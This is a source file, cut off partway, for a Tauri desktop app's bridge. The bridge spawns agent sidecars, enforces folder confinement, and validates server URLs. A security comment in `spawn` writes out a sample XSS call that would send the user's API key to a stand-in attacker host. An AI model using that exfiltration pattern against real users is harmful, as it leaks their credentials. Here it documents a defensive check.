//! Ponte nativa do **Modo Code** (F2). Expõe ao ShvIA web (página remota) o que
//! só o desktop pode fazer: spawnar o `anna --json` como **sidecar** na pasta do
//! projeto, conversar por stdin/stdout (NDJSON), escolher pasta e guardar o
//! vínculo projeto→pasta.
//!
//! Postura de menor privilégio (ADR-001): **não** usa comando/IPC Tauri. O canal
//! page→Rust é o **message-handler nativo do WebView**, que muda por SO:
//! `window.webkit.messageHandlers.shviaCode` no WebKit (Linux/macOS) e
//! `window.chrome.webview` no WebView2 (Windows). Rust→page é sempre `eval`. O
//! transporte é registrado por SO — `configure_linux_webview` (WebKitGTK),
//! `macos_ipc::install` (WKWebView) e `windows_ipc::install` (WebView2) —, mas a
//! lógica aqui é agnóstica de SO: todos chamam `handle_message`. Sem handler
//! (ex.: mobile) o shim não define `window.__shviaDesktop`, então o web esconde
//! o Modo Code (fail-safe).
//!
//! Protocolo NDJSON do `anna`: `SHVIA-CODE/docs/embedding.md`.

use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use tauri::{Manager, WebviewWindow};
use tauri_plugin_notification::NotificationExt;

// 1.6.41: the bridge is split by subject. This file keeps the dispatch (`handle_message`) and
// what every part shares (`reply`, `fora_da_ui`, `saida_com_prazo` and its deadlines).
mod painel;
use painel::*;
mod cerca;
use cerca::*;
mod shim;
pub use shim::{bridge_token, inject_token, BRIDGE_JS};
mod dialogos;
use dialogos::*;
mod motores;
use motores::*;
mod login;
use login::*;
pub use login::cancelar_login;
pub(crate) use motores::{engine_status, versao_do_anna};

/// Um sidecar `anna` de uma janela (uma sessão code ativa por janela). `gen` é a
/// geração da sessão — a thread de stdout usa pra saber se ainda é a sessão viva.
struct Sidecar {
    child: Child,
    stdin: ChildStdin,
    gen: u64,
}

/// How long an engine gets to leave on its own before it is killed (1.6.29).
const PRAZO_PARA_SAIR: std::time::Duration = std::time::Duration::from_secs(2);

/// Ends a sidecar the way a person would: ask, wait, then force (1.6.29).
///
/// `child.kill()` alone is SIGKILL on Unix (TerminateProcess on Windows): the engine got no
/// chance to run its exit path, so the Claude SDK's cleanup of the `claude` CLI it spawned
/// (`process.on("exit")`), the Codex runner's `encerrar` (which kills `codex app-server`), and a
/// running tool (`npm run dev`, `cargo test`) were skipped — orphans holding ports and locks.
/// Every engine leaves on `{"type":"exit"}` or on stdin EOF: this sends the first, closes stdin,
/// polls for `prazo`, and only then kills.
fn encerrar_com_prazo(sc: Sidecar, prazo: std::time::Duration) {
    encerrar_varios_com_prazo(vec![sc], prazo);
}

/// The same for several at once, under ONE deadline (the app's exit must not wait 2 s each).
fn encerrar_varios_com_prazo(varios: Vec<Sidecar>, prazo: std::time::Duration) {
    let mut filhos: Vec<Child> = varios
        .into_iter()
        .map(|sc| {
            let Sidecar { child, mut stdin, .. } = sc;
            let _ = writeln!(stdin, r#"{{"type":"exit"}}"#);
            let _ = stdin.flush();
            drop(stdin); // EOF, for an engine that only watches stdin
            child
        })
        .collect();
    let inicio = std::time::Instant::now();
    while inicio.elapsed() < prazo {
        filhos.retain_mut(|c| !matches!(c.try_wait(), Ok(Some(_))));
        if filhos.is_empty() {
            return;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    for mut c in filhos {
        let _ = c.kill();
        let _ = c.wait();
    }
}

/// Registro de sidecars por rótulo de janela — em Tauri managed state.
/// Cada entrada fica em `Option<Sidecar>` para que `send_line` consiga TIRAR
/// o sidecar do mapa sob o lock, escrever no stdin FORA do lock (o pipe pode
/// bloquear se o anna estiver ocupado), e devolver a entrada no lock de novo.
#[derive(Default)]
pub struct Sidecars {
    map: Mutex<HashMap<String, Option<Sidecar>>>,
    next_gen: AtomicU64,
}

impl Sidecars {
    fn kill_label(&self, label: &str) {
        // Remove sob o lock, mas mata/espera FORA dele — child.wait() pode bloquear
        // e seguraria o Mutex global (send/insert de outras janelas travariam).
        let sc = self
            .map
            .lock()
            .ok()
            .and_then(|mut m| m.remove(label))
            .and_then(|opt| opt);
        // Off the calling thread: this runs on "Parar", on a reload and on window close, all
        // on the UI thread, and the engine gets up to PRAZO_PARA_SAIR to leave on its own.
        if let Some(sc) = sc {
            std::thread::spawn(move || encerrar_com_prazo(sc, PRAZO_PARA_SAIR));
        }
    }

    /// Mata o sidecar de UMA janela (fechou a janela).
    pub fn kill_one(&self, label: &str) {
        self.kill_label(label);
    }

    /// Há sessão do Code viva nesta janela?
    ///
    /// Existe para o guard de fechamento (`decidir_fechar`): fechar com `anna` no ar
    /// perde a sessão **e** deixa o processo órfão. Medido em 20/08/2026 nesta máquina:
    /// **dois** `anna` vivos e um `shvia-desktop` zumbi desde 06/08 — órfão não é
    /// hipótese, é o estado atual.
    ///
    /// `Some(None)` no mapa é sessão em criação (o slot é reservado antes do spawn), e
    /// conta como viva de propósito: perguntar de graça é barato, fechar por cima de um
    /// spawn em curso deixa exatamente o órfão que este guard existe para evitar.
    pub fn tem_sessao(&self, label: &str) -> bool {
        self.map.lock().map(|m| m.contains_key(label)).unwrap_or(false)
    }

    /// Mata todos (saída do app — anti-órfão).
    pub fn kill_all(&self) {
        let drained: Vec<Sidecar> = self
            .map
            .lock()
            .ok()
            .map(|mut m| {
                m.drain()
                    .filter_map(|(_, opt)| opt)
                    .collect()
            })
            .unwrap_or_default();
        // At app exit, synchronously: a thread would die with the process. One shared
        // deadline for all of them.
        encerrar_varios_com_prazo(drained, PRAZO_PARA_SAIR);
    }

    /// Registra o sidecar da janela (nova geração), matando o anterior (troca de
    /// sessão). Devolve a geração desta sessão.
    fn insert(&self, label: String, child: Child, stdin: ChildStdin) -> u64 {
        let gen = self.next_gen.fetch_add(1, Ordering::Relaxed) + 1;
        let old = self.map.lock().ok().and_then(|mut m| {
            m.insert(
                label,
                Some(Sidecar {
                    child,
                    stdin,
                    gen,
                }),
            )
        });
        if let Some(Some(old)) = old {
            std::thread::spawn(move || encerrar_com_prazo(old, PRAZO_PARA_SAIR));
        }
        gen
    }

    /// Colhe o sidecar desta geração e devolve o **código de saída** dele.
    ///
    /// `None` = esta geração já não é a sessão viva (respawn ou kill), e nesse caso o
    /// chamador não deve sinalizar nada — é a mesma guarda que o `is_current` fazia.
    /// `Some(None)` = era a sessão viva, mas o código não pôde ser lido.
    ///
    /// 🔴 Existe porque o `exited` era mudo. A ponte descobria a morte pelo stdout
    /// fechando e emitia `{type:'exited'}` sem mais nada — o que serve enquanto todo
    /// motor morre por um motivo só. O `codex-runner` morre por DOIS: acabou, ou
    /// recusou subir porque o sandbox não segurou. Sem o código, a tela conta os dois
    /// como a mesma coisa, e o segundo é justamente o que o usuário precisa ler.
    ///
    /// Remove sob o lock e espera FORA dele, pela mesma razão do `kill_label`:
    /// `wait()` pode bloquear e seguraria o Mutex global.
    fn colher(&self, label: &str, gen: u64) -> Option<Option<i32>> {
        let sc = {
            let mut m = self.map.lock().ok()?;
            match m.get(label).and_then(|opt| opt.as_ref()) {
                Some(sc) if sc.gen == gen => m.remove(label).and_then(|opt| opt),
                _ => return None,
            }
        };
        let mut sc = sc?;
        Some(sc.child.wait().ok().and_then(|st| st.code()))
    }

    /// Escreve uma linha no stdin do sidecar da janela (mensagem ou decisão).
    /// `false` = não havia sessão viva ou a escrita falhou (o host então sabe que
    /// a decisão/mensagem caiu, em vez de assumir ok).
    ///
    /// Importante: o `writeln!+flush` acontece FORA do Mutex global — se o pipe
    /// do anna encher (tool longa, gate bloqueante), só esta chamada trava;
    /// outras janelas e o spawn/kill continuam funcionando.
    fn send_line(&self, label: &str, line: &str) -> bool {
        let mut sidecar = match self.map.lock() {
            Ok(mut map) => match map.get_mut(label) {
                Some(slot) => slot.take(),
                None => None,
            },
            Err(_) => None,
        };
        let Some(mut sc) = sidecar.take() else {
            return false;
        };
        let ok = writeln!(sc.stdin, "{line}").and_then(|_| sc.stdin.flush()).is_ok();
        if let Ok(mut map) = self.map.lock() {
            if let Some(slot) = map.get_mut(label) {
                *slot = Some(sc);
            }
            // Se a janela foi removida entre os dois locks, recria sem gravar
            // de volta (a sessão está morta). Sem leak: o Child morre no drop.
        }
        ok
    }
}

/// How long each external call may take before the bridge gives up on it (1.6.19).
///
/// Until 1.6.19 every one of these ran with `.output()` and no bound, most of them on the UI
/// thread: a `--version` that waited on stdin, an interactive shell whose rc file prompted, a
/// `git status` in a huge tree, `npm ci` on a slow network — each froze every window, and one
/// that never returned froze them for good. The numbers are generous on purpose: a bound exists
/// to turn "forever" into an error the page can show, not to race a slow machine.
const PRAZO_VERSAO: std::time::Duration = std::time::Duration::from_secs(10);
const PRAZO_CATALOGO: std::time::Duration = std::time::Duration::from_secs(60);
const PRAZO_AUTH_STATUS: std::time::Duration = std::time::Duration::from_secs(30);
const PRAZO_GIT: std::time::Duration = std::time::Duration::from_secs(30);
const PRAZO_INSTALACAO: std::time::Duration = std::time::Duration::from_secs(10 * 60);
const PRAZO_URL_DO_LOGIN: std::time::Duration = std::time::Duration::from_secs(60);
pub(crate) const PRAZO_SHELL_INTERATIVO: std::time::Duration = std::time::Duration::from_secs(10);

/// `Command::output()` with a deadline: past it the child is killed and the call returns
/// `ErrorKind::TimedOut`. Both pipes are drained on their own threads (a full pipe would block
/// the child), and a grandchild that keeps a pipe open after the child exits — a daemon started
/// by an rc file — cannot hold the call past the deadline: whatever arrived is returned.
pub(crate) fn saida_com_prazo(
    mut cmd: Command,
    prazo: std::time::Duration,
) -> std::io::Result<std::process::Output> {
    use std::io::Read;
    use std::sync::mpsc;
    cmd.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut filho = cmd.spawn()?;
    let drenar = |cano: Option<Box<dyn Read + Send>>| {
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let mut b = Vec::new();
            if let Some(mut c) = cano {
                let _ = c.read_to_end(&mut b);
            }
            let _ = tx.send(b);
        });
        rx
    };
    let rx_out = drenar(filho.stdout.take().map(|c| Box::new(c) as Box<dyn Read + Send>));
    let rx_err = drenar(filho.stderr.take().map(|c| Box::new(c) as Box<dyn Read + Send>));
    let inicio = std::time::Instant::now();
    let status = loop {
        if let Some(st) = filho.try_wait()? {
            break st;
        }
        if inicio.elapsed() >= prazo {
            let _ = filho.kill();
            let _ = filho.wait();
            return Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                format!("sem resposta em {} s", prazo.as_secs()),
            ));
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    };
    let resto = prazo.saturating_sub(inicio.elapsed()).max(std::time::Duration::from_secs(1));
    let stdout = rx_out.recv_timeout(resto).unwrap_or_default();
    let stderr = rx_err.recv_timeout(std::time::Duration::from_secs(1)).unwrap_or_default();
    Ok(std::process::Output { status, stdout, stderr })
}

/// Runs a bridge action off the UI thread and replies from there (1.6.19).
///
/// `handle_message` is called on the event loop — the WebKitGTK signal on Linux, the main thread
/// on macOS, `WebMessageReceived` on Windows — which paints EVERY window. Until 1.6.19 the arms
/// that start a process or walk the disk ran right there: the runner install (`npm ci`), the
/// login's URL read, the interactive shell of account discovery, `git status` on every window
/// focus. `reply` already hops back to the main thread to `eval`, so the work can run anywhere.
fn fora_da_ui(
    window: &WebviewWindow,
    req: &str,
    trabalho: impl FnOnce(&WebviewWindow) -> (bool, serde_json::Value) + Send + 'static,
) {
    let w = window.clone();
    let req = req.to_string();
    std::thread::spawn(move || {
        let (ok, dados) = trabalho(&w);
        reply(&w, &req, ok, dados);
    });
}

/// One runner install at a time: two would overwrite the same directories concurrently.
static INSTALANDO: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

/// Ponto de entrada do handler nativo: recebe uma mensagem JSON da página.
pub fn handle_message(window: &WebviewWindow, payload: &str) {
    let v: serde_json::Value = match serde_json::from_str(payload) {
        Ok(v) => v,
        Err(_) => return,
    };
    // Cap de capacidade: só a página injetada num host de SERVER_HOSTS conhece o token
    // de sessão. Um <iframe> cross-origin embutido alcança o messageHandler
    // nativo mas não tem o token → descartado (silêncio, sem oráculo). Cobre os
    // 3 SOs num só ponto, sem depender de API de origem de frame.
    if v.get("__t").and_then(|t| t.as_str()) != Some(bridge_token()) {
        return;
    }
    let action = v.get("action").and_then(|a| a.as_str()).unwrap_or_default();
    let req = v.get("reqId").and_then(|r| r.as_str()).unwrap_or_default().to_string();
    match action {
        "spawn" => spawn(window, &req, &v),
        "send" => {
            let ok = send(window, &v);
            reply(window, &req, ok, serde_json::json!({ "ok": ok }));
        }
        "kill" => {
            window.app_handle().state::<Sidecars>().kill_label(window.label());
            reply(window, &req, true, serde_json::json!({ "ok": true }));
        }
        "pickFolder" => pick_folder(window, req),
        "pickFiles" => pick_files(window, req),
        "saveFile" => save_file(window, req, &v),
        "getBinding" => {
            let pid = v.get("projectId").and_then(|p| p.as_str()).unwrap_or_default();
            let path = load_bindings(window).get(pid).and_then(|x| x.as_str()).map(String::from);
            reply(window, &req, true, serde_json::json!({ "path": path }));
        }
        // O vínculo projeto→pasta deixa de ser um caminho livre: ele só pode apontar para
        // uma pasta já autorizada pelo diálogo. Sem isto, a página reabriria a cerca por
        // fora — bastava gravar o binding e pedir a leitura em seguida.
        "setBinding" => {
            let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
            if !path.is_empty() && !pasta_autorizada(window, path) {
                return reply(window, &req, false, fora_da_cerca());
            }
            set_binding(window, &v);
            reply(window, &req, true, serde_json::json!({ "ok": true }));
        }
        // 🔴 A CERCA (F-12): as quatro ações de arquivo só abrem dentro de uma pasta que o
        // usuário escolheu no diálogo nativo. Antes, o confinamento era relativo ao `path`
        // que a própria página mandava — quem pede escolhia a cerca. Ver `pasta_autorizada`.
        "gitStatus" => {
            let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
            if !pasta_autorizada(window, path) {
                return reply(window, &req, false, fora_da_cerca());
            }
            let path = path.to_string();
            fora_da_ui(window, &req, move |_| (true, git_status(&path)));
        }
        "listTree" => {
            let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
            if !pasta_autorizada(window, path) {
                return reply(window, &req, false, fora_da_cerca());
            }
            let path = path.to_string();
            fora_da_ui(window, &req, move |_| (true, list_tree(&path)));
        }
        "gitDiff" => {
            let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
            let file = v.get("file").and_then(|x| x.as_str()).unwrap_or_default();
            if !pasta_autorizada(window, path) {
                return reply(window, &req, false, fora_da_cerca());
            }
            let (path, file) = (path.to_string(), file.to_string());
            fora_da_ui(window, &req, move |_| (true, git_diff(&path, &file)));
        }
        "readFile" => {
            let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
            let file = v.get("file").and_then(|x| x.as_str()).unwrap_or_default();
            if !pasta_autorizada(window, path) {
                return reply(window, &req, false, fora_da_cerca());
            }
            let (path, file) = (path.to_string(), file.to_string());
            fora_da_ui(window, &req, move |_| (true, read_file(&path, &file)));
        }
        "codexModels" => fora_da_ui(window, &req, |_| {
            let out = codex_models();
            (out.get("modelos").is_some(), out)
        }),
        /* Portão 2: o login, conduzido pela tela (1.5.17).
         *
         * `claudeAuthStatus` é leitura pura e sem cota — o `claude auth status --json` é
         * comando público, com `--json` declarado no `--help` do cliente.
         *
         * Os dois seguintes formam UM fluxo: `...LoginStart` sobe o cliente e devolve a URL,
         * `...LoginCode` entrega o código colado. O processo fica vivo entre os dois porque o
         * código só vale para o `code_challenge` da sessão que o gerou. */
        "claudeAuthStatus" => {
            let id = v.get("accountId").and_then(|x| x.as_str()).unwrap_or_default().to_string();
            fora_da_ui(window, &req, move |w| {
                let (contas, _) = crate::contas_claude::registro(w.app_handle());
                match crate::contas_claude::resolver(&contas, &id) {
                    Ok(dir) => {
                        let out = claude_auth_status(dir.as_ref());
                        (out.get("erro").is_none(), out)
                    }
                    Err(e) => (false, serde_json::json!({ "erro": e.mensagem(), "codigo": e.codigo() })),
                }
            });
        }
        "claudeAuthLoginStart" => {
            let id = v.get("accountId").and_then(|x| x.as_str()).unwrap_or_default().to_string();
            fora_da_ui(window, &req, move |w| {
                let (contas, _) = crate::contas_claude::registro(w.app_handle());
                match crate::contas_claude::resolver(&contas, &id) {
                    Ok(dir) => {
                        // 🔴 The person confirms, natively, before anything is spawned (1.6.38).
                        // See `confirmar_login`. Off the UI thread: `fora_da_ui` runs this.
                        let perfil = crate::contas_claude::achar(&contas, &id)
                            .map(|c| c.rotulo.clone())
                            .unwrap_or_default();
                        if !confirmar_login(w, &perfil, dir.is_none()) {
                            return (false, serde_json::json!({
                                "erro": "login cancelado — nada foi aberto",
                                "codigo": "cancelado",
                            }));
                        }
                        match iniciar_login(w, dir.as_ref()) {
                            Ok((url, login)) => (true, serde_json::json!({ "url": url, "login": login })),
                            Err((c, m)) => (false, serde_json::json!({ "erro": m, "codigo": c })),
                        }
                    }
                    Err(e) => (false, serde_json::json!({ "erro": e.mensagem(), "codigo": e.codigo() })),
                }
            });
        }
        "claudeAuthLoginCode" => {
            let codigo = v.get("codigo").and_then(|x| x.as_str()).unwrap_or_default().trim().to_string();
            if codigo.is_empty() {
                reply(window, &req, false,
                    serde_json::json!({ "erro": "código vazio", "codigo": "codigo_vazio" }));
            } else {
                // 🔴 Volta na HORA. O fim chega pelo evento `claude_login_fim`, e o
                // veredito vem do `claudeAuthStatus` — não daqui, não do stdout, não do
                // código de saída (medido: `0` nos dois finais).
                match entregar_codigo(&codigo) {
                    Ok(()) => reply(window, &req, true, serde_json::json!({ "entregue": true })),
                    Err((c, m)) => reply(window, &req, false,
                        serde_json::json!({ "erro": m, "codigo": c })),
                }
            }
        }
        "claudeAuthLoginCancel" => {
            cancelar_login();
            reply(window, &req, true, serde_json::json!({ "cancelado": true }));
        }
        "claudeModels" => {
            // A conta é resolvida ANTES de rodar o binário: id desconhecido ou pasta que
            // sumiu não spawnam nada. Falhar aqui é mais barato e mais honesto que subir um
            // processo que vai autenticar na conta errada e devolver um catálogo plausível.
            let id = v.get("accountId").and_then(|x| x.as_str()).unwrap_or_default().to_string();
            fora_da_ui(window, &req, move |w| {
                let (contas, _) = crate::contas_claude::registro(w.app_handle());
                match crate::contas_claude::resolver(&contas, &id) {
                    Ok(dir) => {
                        let out = claude_models(dir.as_ref());
                        (out.get("modelos").is_some(), out)
                    }
                    Err(e) => (false, serde_json::json!({ "erro": e.mensagem(), "codigo": e.codigo() })),
                }
            });
        }
        // Perfis de conta do Claude Code (ADR-033). Só ids e rótulos saem daqui — nunca o
        // caminho do diretório de configuração, que a página não usa e não pode devolver.
        "claudeAccounts" => {
            let out = crate::contas_claude::como_json(window.app_handle());
            reply(window, &req, true, out);
        }
        /* Descoberta: pergunta ao SHELL quais funções trocam de conta (ADR-033 §macOS).
         *
         * 🔴 Gesto explícito, nunca o boot: sobe um shell INTERATIVO, que roda a config da
         * pessoa. E aqui o caminho SAI para a tela — é a única forma de ela conferir que a
         * resolução pegou a conta certa antes de cadastrar. O que a página nunca faz é
         * MANDAR um: o cadastro abaixo vai por `alias`, e quem resolve é o lado nativo. */
        /* Instala o `claude-runner` a partir da fonte que viaja NO INSTALADOR (1.5.16).
         *
         * 🔴 O portão que travava todo usuário novo: o runner nunca viajou no instalador,
         * e a única saída era clonar o repositório e rodar o `install.sh`. Quem não é
         * desenvolvedor parava aí — e a mensagem de ausência mandava rodar um arquivo que
         * não existia na máquina dele.
         *
         * A fonte são ~124 KB (`bundle.resources`); os 236 MB de `node_modules` ficam de
         * fora e nascem aqui, com `npm ci`, na máquina. São naturezas diferentes: o `anna`
         * é um binário autossuficiente e viaja; o runner é script mais árvore de
         * dependências e precisa de Node.
         *
         * Gesto explícito, nunca no boot: baixa pacote da rede e leva segundos.
         *
         * **Não reimplementa a instalação.** Roda o MESMO `install.sh` — que se localiza
         * pelo próprio caminho e acha os irmãos ao lado. Reescrever os passos em Rust
         * criaria duas definições do que é uma instalação, e a que o desenvolvedor testa
         * no terminal deixaria de ser a que o usuário recebe. */
        "claudeRunnerInstall" => {
            use std::sync::atomic::Ordering;
            if INSTALANDO.swap(true, Ordering::SeqCst) {
                return reply(window, &req, false, serde_json::json!({
                    "erro": "já há uma instalação do claude-runner em andamento",
                    "codigo": "instalacao_em_andamento",
                }));
            }
            fora_da_ui(window, &req, |w| {
                let r = instalar_claude_runner(w.app_handle());
                INSTALANDO.store(false, Ordering::SeqCst);
                match r {
                    Ok(saida) => (true, serde_json::json!({ "saida": saida })),
                    Err((codigo, msg)) => (false, serde_json::json!({ "erro": msg, "codigo": codigo })),
                }
            });
        }
        "claudeAccountsDetect" => fora_da_ui(window, &req, |_| {
            let home = std::path::PathBuf::from(std::env::var("HOME").unwrap_or_default());
            let achados = crate::contas_claude::descobrir(&home, &|p| p.is_dir());
            let lista: Vec<_> = achados
                .iter()
                .map(|c| {
                    serde_json::json!({
                        "alias": c.alias,
                        "var": c.var.nome(),
                        "dir": c.dir,
                        "disponivel": c.disponivel,
                    })
                })
                .collect();
            (true, serde_json::json!({ "candidatos": lista }))
        }),
        "claudeAccountAdd" => {
            let alias = v.get("alias").and_then(|x| x.as_str()).unwrap_or_default().to_string();
            let rotulo = v.get("rotulo").and_then(|x| x.as_str()).unwrap_or_default().to_string();
            fora_da_ui(window, &req, move |w| {
                match crate::contas_claude::registrar_por_alias(w.app_handle(), &alias, &rotulo) {
                    Ok(_) => (true, crate::contas_claude::como_json(w.app_handle())),
                    Err(e) => (false, serde_json::json!({ "erro": e.mensagem(), "codigo": e.codigo() })),
                }
            });
        }
        "claudeAccountSelect" => {
            let id = v.get("accountId").and_then(|x| x.as_str()).unwrap_or_default();
            match crate::contas_claude::selecionar(window.app_handle(), id) {
                Ok(sel) => reply(window, &req, true, serde_json::json!({ "selecionada": sel })),
                Err(e) => reply(
                    window,
                    &req,
                    false,
                    serde_json::json!({ "erro": e.mensagem(), "codigo": e.codigo() }),
                ),
            }
        }
        // Notificação nativa do SO (alertas de preço, ADR-011). Fire-and-forget:
        // sem reqId/reply — a página só dispara, não espera resposta.
        "notify" => notify(window, &v),
        // Contagem no ícone do dock/taskbar (ADR-011, revisado na 0.13.0).
        // Fire-and-forget pela mesma razão do notify.
        "badge" => badge(window, &v),
        // Item D3 (ADR-026): escreve a config de um cliente de CLI no host. A página manda
        // VALORES (cliente, base, chave, modelo) — nunca caminho nem conteúdo de arquivo.
        // Quem monta o JSON e escolhe o destino de uma lista fechada é o Rust, e o usuário
        // confirma num diálogo nativo com o caminho à vista.
        "writeCliConfig" => crate::cli_config::escrever(window, req, &v),
        // Estado do motor no disco (item D5).
        //
        // ⚠️ O comentário que estava aqui dizia que "a página pergunta ANTES de
        // oferecer o Modo Code". **Não perguntava, e não tinha como**: o wrapper JS
        // nunca expôs esta ação, então o braço era inalcançável desde que nasceu —
        // e o comentário descrevia um consumidor que não existia. Pior, ele estava
        // colado no `writeCliConfig`, então lia como se fosse dele. Exposto no
        // wrapper na 1.1.32; o consumidor real é a chip do MOTOR, que passa a
        // mostrar a versão para quem for pedir suporte.
        //
        // NÃO é gate de capacidade: para isso existe `recursos` no wrapper. Esta
        // ação só existe em cascas que já a expõem, então usá-la como gate
        // responderia sempre "sim" — o contrário do que um gate precisa fazer.
        "engineStatus" => {
            let base = v.get("engine").and_then(|x| x.as_str()).unwrap_or("gateway");
            let (exe, _, _) = motor_do_engine(base);
            fora_da_ui(window, &req, move |_| (true, engine_status(exe)));
        }
        _ => reply(window, &req, false, serde_json::json!({ "error": "ação desconhecida" })),
    }
}

/// `true` se `url` for um endereço https de um host do servidor do ShvIA
/// (`crate::SERVER_HOSTS`). Usada para validar o campo `url` que a PÁGINA manda no
/// `spawn` — a mesma allowlist exata de `is_internal` e de
/// `windows_ipc::ALLOWED_MESSAGE_ORIGINS`, para o perímetro ter uma resposta só.
///
/// Compara HOST parseado, nunca prefixo de string: `starts_with` deixaria passar
/// `https://ai.shvia.org.atacante.tld`, que é outro domínio.
fn url_do_servidor(url: &str) -> bool {
    match url.parse::<tauri::Url>() {
        Ok(u) => u.scheme() == "https" && u.host_str().is_some_and(crate::is_server_host),
        Err(_) => false,
    }
}

/// The Run's flags for the Claude runner (RUN-20260910, B3), from the `autonomy` object
/// the page sends in `spawn`: `{stopByHost: bool, maxIterations: n, maxCostUsd: x}`.
///
/// Absent object → no flag, and the runner behaves as before 1.5.0: it never emits
/// `stop_request` and sets no cap. Presence, not a version number, is the gate — the
/// `recursos.run` flag in the shim is how the page learns this shell knows the field.
///
/// A value that is not a positive number is DROPPED, never coerced: a cap of 0 would end
/// every turn before it started, and the runner refuses it the same way (`parada.mjs`).
/// Two guards agreeing is not redundancy here — the flag crosses a process boundary, and
/// each side reads its own input.
fn argumentos_da_run(autonomy: Option<&serde_json::Value>) -> Vec<String> {
    let mut args: Vec<String> = Vec::new();
    let Some(a) = autonomy.filter(|a| a.is_object()) else {
        return args;
    };
    if a.get("stopByHost").and_then(|x| x.as_bool()).unwrap_or(false) {
        args.push("--parada".into());
        args.push("host".into());
    }
    if let Some(n) = a
        .get("maxIterations")
        .and_then(|x| x.as_f64())
        .filter(|n| n.is_finite() && *n >= 1.0)
    {
        args.push("--teto-iteracoes".into());
        args.push((n.floor() as u64).to_string());
    }
    if let Some(c) = a
        .get("maxCostUsd")
        .and_then(|x| x.as_f64())
        .filter(|c| c.is_finite() && *c > 0.0)
    {
        args.push("--teto-custo".into());
        args.push(format!("{c}"));
    }
    args
}

fn spawn(window: &WebviewWindow, req: &str, v: &serde_json::Value) {
    let s = |k: &str| v.get(k).and_then(|x| x.as_str()).unwrap_or_default().to_string();
    let dir = s("projectDir");
    if dir.is_empty() || !PathBuf::from(&dir).is_dir() {
        return reply(window, req, false, serde_json::json!({ "error": "pasta do projeto inválida" }));
    }
    // A cerca (F-12) vale para o agente também: o `projectDir` é onde ele vai LER e ESCREVER
    // por horas. Deixar a página escolher a raiz do agente seria a mesma porta do `readFile`,
    // com muito mais alcance — o gate do próprio `anna` confina na raiz que recebe daqui.
    if !pasta_autorizada(window, &dir) {
        return reply(
            window,
            req,
            false,
            serde_json::json!({ "error": "pasta não autorizada — escolha a pasta do projeto pelo botão do app" }),
        );
    }
    // Motor: "gateway" (anna, default) ou "claude" (claude-runner — Claude Code
    // com a ASSINATURA do usuário, FORA do gateway). Ambos falam o mesmo NDJSON
    // (embedding.md), então o bridge e a UI de cards não mudam. Sem `engine` = anna.
    let engine = s("engine");
    let is_claude = engine == "claude";
    let (exe_base, erro_ausente, cod_ausente) = motor_do_engine(&engine);
    let Some(bin) = resolve_bin(exe_base) else {
        return reply(window, req, false,
            serde_json::json!({ "error": erro_ausente, "codigo": cod_ausente }));
    };

    let mut cmd = Command::new(bin);
    cmd.current_dir(&dir);
    // App de GUI não herda o PATH do shell (ADR-029): sem isto o agente não
    // encontra npx/node/cargo/php e fica insistindo em comando que não existe.
    if let Some(p) = crate::user_env::sidecar_path() {
        cmd.env("PATH", p);
    }
    let (model, effort, url, key) = (s("model"), s("effort"), s("url"), s("apiKey"));

    // `url` vem da PÁGINA e viaja junto com SHVIA_API_KEY (a chave do usuário) —
    // então é entrada não confiável no caminho de um segredo, e passa pela MESMA
    // allowlist do resto do perímetro (`crate::SERVER_HOSTS`). Sem esta checagem,
    // um XSS na página do ShvIA — ou um asset de terceiro comprometido; a CSP do
    // web nasce DESLIGADA (SHVIA-WEB/config/security.php) — chamaria
    // `__shviaCode.spawn({url:'https://coletor.atacante.tld', apiKey:'…'})` e o
    // agente mandaria a chave em `X-API-Key` para lá. O anna só exige https, e
    // https qualquer atacante tem.
    //
    // Rejeitar é seguro para o uso legítimo: o web manda `location.origin`
    // (code-mode.js), e uma página que roda num host do servidor tem, por
    // definição, origem que passa. Falha ALTO em vez de cair no default
    // compilado — silenciar mandaria o turno para o host errado sem sintoma.
    if !url.is_empty() && !url_do_servidor(&url) {
        return reply(
            window,
            req,
            false,
            serde_json::json!({ "error": "url de servidor não autorizada" }),
        );
    }
    // Conta resolvida, para a resposta ecoar o que de fato valeu. Só o motor Claude tem
    // conta; no `anna` fica `None` e o campo não sai.
    let mut resolvida: Option<(String, String)> = None;
    if is_claude {
        // Assinatura via cliente oficial: NADA de SHVIA_API_KEY nem `--url` — este
        // motor não passa pelo gateway, então chave e endpoint do ShvIA não se
        // aplicam e mandá-los seria vazar credencial para fora do perímetro dele.
        //
        // `--model` e `--effort` SIM (21/08) — mas **só quando a página garante
        // que vieram do catálogo do Claude**, via `modelDoClaude: true`.
        //
        // Sem essa trava a correção viraria regressão: até agora o modelo era
        // lido e descartado aqui, então a UI mandando `openai/gpt-5.6-sol` (o
        // catálogo do GATEWAY, que é o que ela ainda mostra com o motor Claude
        // ativo) não fazia mal nenhum. Repassar sem conferir trocaria "seletor que
        // não faz nada" por "sessão que não abre" — pior, porque quebra o que
        // funcionava.
        //
        // A trava é declarativa de propósito: nada de adivinhar pela forma do id
        // (`contém '/'`?), que erraria no primeiro alias novo. Quem sabe de qual
        // catálogo o valor saiu é quem montou o seletor, e ela diz.
        cmd.args(["--cwd", &dir]);
        // Conta de assinatura (ADR-033). A página manda um `accountId` da lista; quem o
        // traduz em `CLAUDE_CONFIG_DIR` é o `contas_claude::resolver` — o MESMO que o
        // `claudeModels` usa, para descoberta e turno não poderem divergir de conta.
        //
        // 🔴 Falha ALTO, sem fallback. Cair na conta padrão quando o id não resolve seria
        // rodar o turno numa assinatura que o usuário não escolheu, com a tela mostrando o
        // nome da que ele escolheu — e sob assinatura isso gasta a cota da conta errada.
        // Um erro na hora é barato; a sessão silenciosa na conta errada não é.
        let (contas, _) = crate::contas_claude::registro(window.app_handle());
        let account_id = v.get("accountId").and_then(|x| x.as_str()).unwrap_or_default();
